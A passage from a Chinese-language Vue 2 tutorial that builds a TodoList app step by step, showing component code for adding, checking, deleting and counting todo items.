<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;li&gt;<br>    &lt;label&gt;<br>      &lt;input type&#x3D;&quot;checkbox&quot; :checked&#x3D;&quot;todo.done&quot; &#x2F;&gt;<br>      &lt;span&gt;&#123;&#123; todo.title &#125;&#125;&lt;&#x2F;span&gt;<br>    &lt;&#x2F;label&gt;<br>    &lt;button class&#x3D;&quot;btn btn-danger&quot; style&#x3D;&quot;display: none&quot;&gt;删除&lt;&#x2F;button&gt;<br>  &lt;&#x2F;li&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;TodoItem&quot;,<br>  props: [&quot;todo&quot;],<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p>修改后的<code>TodoList.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;ul class&#x3D;&quot;todo-main&quot;&gt;<br>    &lt;TodoItem v-for&#x3D;&quot;todoObj in todos&quot; :key&#x3D;&quot;todoObj.id&quot; :todo&#x3D;&quot;todoObj&quot;&gt;<br>    &lt;&#x2F;TodoItem&gt;<br>  &lt;&#x2F;ul&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>import TodoItem from &quot;.&#x2F;TodoItem.vue&quot;;<br><br>export default &#123;<br>  name: &quot;TodoList&quot;,<br>  components: &#123; TodoItem &#125;,<br>  data() &#123;<br>    return &#123;<br>      todos: [<br>        &#123; id: &quot;001&quot;, title: &quot;吃饭&quot;, done: true &#125;,<br>        &#123; id: &quot;002&quot;, title: &quot;睡觉&quot;, done: false &#125;,<br>        &#123; id: &quot;003&quot;, title: &quot;打游戏&quot;, done: true &#125;,<br>      ],<br>    &#125;;<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<h4 id="3-10-3-添加"><a href="#3-10-3-添加" class="headerlink" title="3.10.3 添加"></a>3.10.3 添加</h4><p>要想随机生成唯一标识<code>id</code>，可以使用：</p>
<ul>
<li><p>时间戳（Date.now()）</p>
</li>
<li><p>随机数（Math.random()）</p>
</li>
<li><p>推荐：<code>uuid</code>可以生成全球唯一<code>id</code>，大致原理是根据地理位置、电脑网卡MAC地址、内存条序列号……生成一个唯一的<code>id</code>，有固定的生成包可以使用，但是由于<code>uuid</code>是在过于庞大，所以我们可以使用简洁版——<code>nanoid</code></p>
<ul>
<li><p>安装：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm i nanoid<br></code></pre></td></tr></table></figure>
</li>
<li><p>采用分别暴露方式，引入：</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">import</span> &#123;nanoid&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;nanoid&#x27;</span>;<br></code></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<p>想要将子组件的数据传给父组件，一种最原始的方法：父组件传给子组件一个函数，子组件在合适的时间调用函数，就能传给父组件数据。</p>
<p>注意：<code>data</code>、<code>props</code>、<code>methods</code>、<code>computed</code>中的数据不能重名！！！</p>
<p><code>App.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>    &lt;div class&#x3D;&quot;todo-container&quot;&gt;<br>      &lt;div class&#x3D;&quot;todo-wrap&quot;&gt;<br>        &lt;TodoHeader :getAdd&#x3D;&quot;getAdd&quot;&gt;&lt;&#x2F;TodoHeader&gt;<br><br>        &lt;TodoList :todos&#x3D;&quot;todos&quot;&gt;&lt;&#x2F;TodoList&gt;<br><br>        &lt;TodoFooter&gt;&lt;&#x2F;TodoFooter&gt;<br>      &lt;&#x2F;div&gt;<br>    &lt;&#x2F;div&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>import TodoFooter from &quot;.&#x2F;components&#x2F;TodoFooter.vue&quot;;<br>import TodoHeader from &quot;.&#x2F;components&#x2F;TodoHeader.vue&quot;;<br>import TodoList from &quot;.&#x2F;components&#x2F;TodoList.vue&quot;;<br><br>export default &#123;<br>  name: &quot;App&quot;,<br>  components: &#123; TodoFooter, TodoHeader, TodoList &#125;,<br>  data() &#123;<br>    return &#123;<br>      todos: [<br>        &#123; id: &quot;001&quot;, title: &quot;吃饭&quot;, done: true &#125;,<br>        &#123; id: &quot;002&quot;, title: &quot;睡觉&quot;, done: false &#125;,<br>        &#123; id: &quot;003&quot;, title: &quot;打游戏&quot;, done: true &#125;,<br>      ],<br>    &#125;;<br>  &#125;,<br>  methods: &#123;<br>    getAdd(Obj) &#123;<br>      this.todos.unshift(Obj);<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p><code>TodoList.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;ul class&#x3D;&quot;todo-main&quot;&gt;<br>    &lt;TodoItem v-for&#x3D;&quot;todoObj in todos&quot; :key&#x3D;&quot;todoObj.id&quot; :todo&#x3D;&quot;todoObj&quot;&gt;<br>    &lt;&#x2F;TodoItem&gt;<br>  &lt;&#x2F;ul&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>import TodoItem from &quot;.&#x2F;TodoItem.vue&quot;;<br><br>export default &#123;<br>  name: &quot;TodoList&quot;,<br>  components: &#123; TodoItem &#125;,<br>  props: [&quot;todos&quot;],<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p><code>TodoHeader.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class&#x3D;&quot;todo-header&quot;&gt;<br>    &lt;input<br>      type&#x3D;&quot;text&quot;<br>      placeholder&#x3D;&quot;请输入你的任务名称，按回车键确认&quot;<br>      @keyup.enter&#x3D;&quot;add&quot;<br>    &#x2F;&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>import &#123; nanoid &#125; from &quot;nanoid&quot;;<br>export default &#123;<br>  name: &quot;TodoHeader&quot;,<br>  methods: &#123;<br>    add(event) &#123;<br>      &#x2F;&#x2F; 数据校验<br>      if (!event.target.value.trim()) return alert(&quot;输入不能为空！&quot;);<br><br>      &#x2F;&#x2F; 将用户的输入包装成为一个todo对象<br>      const todoObj &#x3D; &#123; id: nanoid(), title: event.target.value, done: false &#125;;<br>      this.getAdd(todoObj);<br>      event.target.value &#x3D; &quot;&quot;;<br>    &#125;,<br>  &#125;,<br>  props: [&quot;getAdd&quot;],<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<h4 id="3-10-4-勾选"><a href="#3-10-4-勾选" class="headerlink" title="3.10.4 勾选"></a>3.10.4 勾选</h4><p>绑定<code>change</code>事件 / <code>click</code>事件来实现。</p>
<h5 id="使用父传孙实现"><a href="#使用父传孙实现" class="headerlink" title="使用父传孙实现"></a>使用父传孙实现</h5><p><code>App.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>    &lt;div class&#x3D;&quot;todo-container&quot;&gt;<br>      &lt;div class&#x3D;&quot;todo-wrap&quot;&gt;<br>        &lt;TodoHeader :getAdd&#x3D;&quot;getAdd&quot;&gt;&lt;&#x2F;TodoHeader&gt;<br><br>        &lt;TodoList :todos&#x3D;&quot;todos&quot; :checkTodo&#x3D;&quot;checkTodo&quot;&gt;&lt;&#x2F;TodoList&gt;<br><br>        &lt;TodoFooter&gt;&lt;&#x2F;TodoFooter&gt;<br>      &lt;&#x2F;div&gt;<br>    &lt;&#x2F;div&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>import TodoFooter from &quot;.&#x2F;components&#x2F;TodoFooter.vue&quot;;<br>import TodoHeader from &quot;.&#x2F;components&#x2F;TodoHeader.vue&quot;;<br>import TodoList from &quot;.&#x2F;components&#x2F;TodoList.vue&quot;;<br><br>export default &#123;<br>  name: &quot;App&quot;,<br>  components: &#123; TodoFooter, TodoHeader, TodoList &#125;,<br>  data() &#123;<br>    return &#123;<br>      todos: [<br>        &#123; id: &quot;001&quot;, title: &quot;吃饭&quot;, done: true &#125;,<br>        &#123; id: &quot;002&quot;, title: &quot;睡觉&quot;, done: false &#125;,<br>        &#123; id: &quot;003&quot;, title: &quot;打游戏&quot;, done: true &#125;,<br>      ],<br>    &#125;;<br>  &#125;,<br>  methods: &#123;<br>    getAdd(Obj) &#123;<br>      &#x2F;&#x2F; 添加一个代办<br>      this.todos.unshift(Obj);<br>    &#125;,<br>    checkTodo(id) &#123;<br>      &#x2F;&#x2F; 勾选 &#x2F; 取消勾选一个Todo<br>      this.todos.forEach((todo) &#x3D;&gt; &#123;<br>        if (todo.id &#x3D;&#x3D;&#x3D; id) todo.done &#x3D; !todo.done;<br>      &#125;);<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p><code>Todolist.vue</code></p>
<img src="C:/Users/LEGION/AppData/Roaming/Typora/typora-user-images/image-20210923170521686.png" srcset="/img/loading.gif" lazyload alt="image-20210923170521686" style="zoom:80%;" />

<p><code>TodoItem.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;ul class&#x3D;&quot;todo-main&quot;&gt;<br>    &lt;TodoItem<br>      v-for&#x3D;&quot;todoObj in todos&quot;<br>      :key&#x3D;&quot;todoObj.id&quot;<br>      :todo&#x3D;&quot;todoObj&quot;<br>      :checkTodo&#x3D;&quot;checkTodo&quot;<br>    &gt;<br>    &lt;&#x2F;TodoItem&gt;<br>  &lt;&#x2F;ul&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>import TodoItem from &quot;.&#x2F;TodoItem.vue&quot;;<br><br>export default &#123;<br>  name: &quot;TodoList&quot;,<br>  components: &#123; TodoItem &#125;,<br>  props: [&quot;todos&quot;, &quot;checkTodo&quot;],<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<h5 id="v-model实现"><a href="#v-model实现" class="headerlink" title="v-model实现"></a>v-model实现</h5><p><code>v-model</code>收集表单数据时提到过：如果表单是<code>checkbox</code>类型，并且使用<code>v-model</code>绑定了一个布尔值，那么这个布尔值就能决定<code>checkbox</code>的勾选！即<code>v-model</code>默认绑定了<code>checked</code></p>
<p><code>TodoItem.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;li&gt;<br>    &lt;label&gt;<br>      &lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;todo.done&quot; &#x2F;&gt;<br>      &lt;span&gt;&#123;&#123; todo.title &#125;&#125;&lt;&#x2F;span&gt;<br>    &lt;&#x2F;label&gt;<br>    &lt;button class&#x3D;&quot;btn btn-danger&quot; style&#x3D;&quot;display: none&quot;&gt;删除&lt;&#x2F;button&gt;<br>  &lt;&#x2F;li&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;TodoItem&quot;,<br>  props: [&quot;to&#39;do&quot;]<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p>但是不建议这样做，因为修改了传入的<code>props</code>中的数据，违反了原则，不报错是因为<code>Vue</code>无法监测这种修改，情形如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> obj = &#123;<span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">b</span>:<span class="hljs-number">2</span>&#125;<br><br>obj.a = <span class="hljs-number">66</span> <span class="hljs-comment">// 感知不到</span><br>obj = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">100</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">100</span>&#125; <span class="hljs-comment">// 可以感知到</span><br></code></pre></td></tr></table></figure>

<h4 id="3-10-5-删除"><a href="#3-10-5-删除" class="headerlink" title="3.10.5 删除"></a>3.10.5 删除</h4><p>注意：不要使用<code>delete</code>命名方法，因为它已经被<code>JS</code>中的关键词，用于删除对象中的某一个属性。</p>
<p>浏览器设置控制台输出的内容：<img src="C:/Users/LEGION/AppData/Roaming/Typora/typora-user-images/image-20210923190702114.png" srcset="/img/loading.gif" lazyload alt="image-20210923190702114" style="zoom:80%;" /></p>
<p><code>App.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>    &lt;div class&#x3D;&quot;todo-container&quot;&gt;<br>      &lt;div class&#x3D;&quot;todo-wrap&quot;&gt;<br>        &lt;TodoHeader :getAdd&#x3D;&quot;getAdd&quot;&gt;&lt;&#x2F;TodoHeader&gt;<br><br>        &lt;TodoList<br>          :todos&#x3D;&quot;todos&quot;<br>          :checkTodo&#x3D;&quot;checkTodo&quot;<br>          :deleteTodo&#x3D;&quot;deleteTodo&quot;<br>        &gt;&lt;&#x2F;TodoList&gt;<br><br>        &lt;TodoFooter&gt;&lt;&#x2F;TodoFooter&gt;<br>      &lt;&#x2F;div&gt;<br>    &lt;&#x2F;div&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>import TodoFooter from &quot;.&#x2F;components&#x2F;TodoFooter.vue&quot;;<br>import TodoHeader from &quot;.&#x2F;components&#x2F;TodoHeader.vue&quot;;<br>import TodoList from &quot;.&#x2F;components&#x2F;TodoList.vue&quot;;<br><br>export default &#123;<br>  name: &quot;App&quot;,<br>  components: &#123; TodoFooter, TodoHeader, TodoList &#125;,<br>  data() &#123;<br>    return &#123;<br>      todos: [<br>        &#123; id: &quot;001&quot;, title: &quot;吃饭&quot;, done: true &#125;,<br>        &#123; id: &quot;002&quot;, title: &quot;睡觉&quot;, done: false &#125;,<br>        &#123; id: &quot;003&quot;, title: &quot;打游戏&quot;, done: true &#125;,<br>      ],<br>    &#125;;<br>  &#125;,<br>  methods: &#123;<br>    getAdd(Obj) &#123;<br>      &#x2F;&#x2F; 添加一个代办<br>      this.todos.unshift(Obj);<br>    &#125;,<br>    checkTodo(id) &#123;<br>      &#x2F;&#x2F; 勾选 &#x2F; 取消勾选一个待办事项<br>      this.todos.forEach((todo) &#x3D;&gt; &#123;<br>        if (todo.id &#x3D;&#x3D;&#x3D; id) todo.done &#x3D; !todo.done;<br>      &#125;);<br>    &#125;,<br>    deleteTodo(id) &#123;<br>      &#x2F;&#x2F; 删除一个代办事项<br>      this.todos &#x3D; this.todos.filter((todo) &#x3D;&gt; &#123;<br>        return todo.id !&#x3D;&#x3D; id;<br>      &#125;);<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p><code>TodoList.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;ul class&#x3D;&quot;todo-main&quot;&gt;<br>    &lt;TodoItem<br>      v-for&#x3D;&quot;todoObj in todos&quot;<br>      :key&#x3D;&quot;todoObj.id&quot;<br>      :todo&#x3D;&quot;todoObj&quot;<br>      :checkTodo&#x3D;&quot;checkTodo&quot;<br>      :deleteTodo&#x3D;&quot;deleteTodo&quot;<br>    &gt;<br>    &lt;&#x2F;TodoItem&gt;<br>  &lt;&#x2F;ul&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>import TodoItem from &quot;.&#x2F;TodoItem.vue&quot;;<br><br>export default &#123;<br>  name: &quot;TodoList&quot;,<br>  components: &#123; TodoItem &#125;,<br>  props: [&quot;todos&quot;, &quot;checkTodo&quot;, &quot;deleteTodo&quot;],<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p><code>TodoItem.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;li&gt;<br>    &lt;label&gt;<br>      &lt;input<br>        type&#x3D;&quot;checkbox&quot;<br>        :checked&#x3D;&quot;todo.done&quot;<br>        @click&#x3D;&quot;handlecheck(todo.id)&quot;<br>      &#x2F;&gt;<br>      &lt;span&gt;&#123;&#123; todo.title &#125;&#125;&lt;&#x2F;span&gt;<br>    &lt;&#x2F;label&gt;<br>    &lt;button class&#x3D;&quot;btn btn-danger&quot; @click&#x3D;&quot;handleDelete(todo.id)&quot;&gt;删除&lt;&#x2F;button&gt;<br>  &lt;&#x2F;li&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;TodoItem&quot;,<br>  props: [&quot;todo&quot;, &quot;checkTodo&quot;, &quot;deleteTodo&quot;],<br>  methods: &#123;<br>    handlecheck(id) &#123;<br>      &#x2F;&#x2F; 通知App组件将对应的Todo对象的done值取反<br>      this.checkTodo(id);<br>    &#125;,<br>    handleDelete(id) &#123;<br>      &#x2F;&#x2F; 删除代办事项<br>      if (confirm(&quot;确定删除吗~~？&quot;)) &#123;<br>        this.deleteTodo(id);<br>      &#125;<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<h4 id="3-10-6-底部统计"><a href="#3-10-6-底部统计" class="headerlink" title="3.10.6 底部统计"></a>3.10.6 底部统计</h4><p>reduce方法： <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce">Array.prototype.reduce() </a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js">arr.reduce(callback(accumulator, currentValue[, index[, array]])[, initialValue])<br><br>参数<br>callback<br>执行数组中每个值 (如果没有提供 initialValue则第一个值除外)的函数，包含四个参数：<br>accumulator<br>累计器累计回调的返回值; 它是上一次调用回调时返回的累积值，或initialValue（见于下方）。<br><br>currentValue<br>数组中正在处理的元素。<br>index 可选<br>数组中正在处理的当前元素的索引。 如果提供了initialValue，则起始索引号为<span class="hljs-number">0</span>，否则从索引<span class="hljs-number">1</span>起始。<br>array可选<br>调用reduce()的数组<br>initialValue可选<br>作为第一次调用 callback函数时的第一个参数的值。 如果没有提供初始值，则将使用数组中的第一个元素。 在没有初始值的空数组上调用 reduce 将报错。<br><br>注意：如果没有提供initialValue，reduce 会从索引<span class="hljs-number">1</span>的地方开始执行 callback 方法，跳过第一个索引。如果提供initialValue，从索引<span class="hljs-number">0</span>开始。<br></code></pre></td></tr></table></figure>

<p><code>TodoItem.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class&#x3D;&quot;todo-footer&quot;&gt;<br>    &lt;label&gt;<br>      &lt;input type&#x3D;&quot;checkbox&quot; &#x2F;&gt;<br>    &lt;&#x2F;label&gt;<br>    &lt;span&gt;<br>      &lt;span&gt;已完成&#123;&#123; totalDone &#125;&#125;&lt;&#x2F;span&gt; &#x2F; 全部 &#123;&#123; todos.length &#125;&#125;&lt;&#x2F;span<br>    &gt;<br>    &lt;button class&#x3D;&quot;btn btn-danger&quot;&gt;清除已完成任务&lt;&#x2F;button&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;TodoFooter&quot;,<br>  props: [&quot;todos&quot;],<br>  computed: &#123;<br>    totalDone() &#123;<br>      return this.todos.reduce((pre, todo) &#x3D;&gt; &#123;<br>        return pre + (todo.done ? 1 : 0);<br>      &#125;, 0);<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<h4 id="3-10-7-底部交互"><a href="#3-10-7-底部交互" class="headerlink" title="3.10.7 底部交互"></a>3.10.7 底部交互</h4><h5 id="使用父传子实现"><a href="#使用父传子实现" class="headerlink" title="使用父传子实现"></a>使用父传子实现</h5><p><code>Footer.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class&#x3D;&quot;todo-footer&quot; 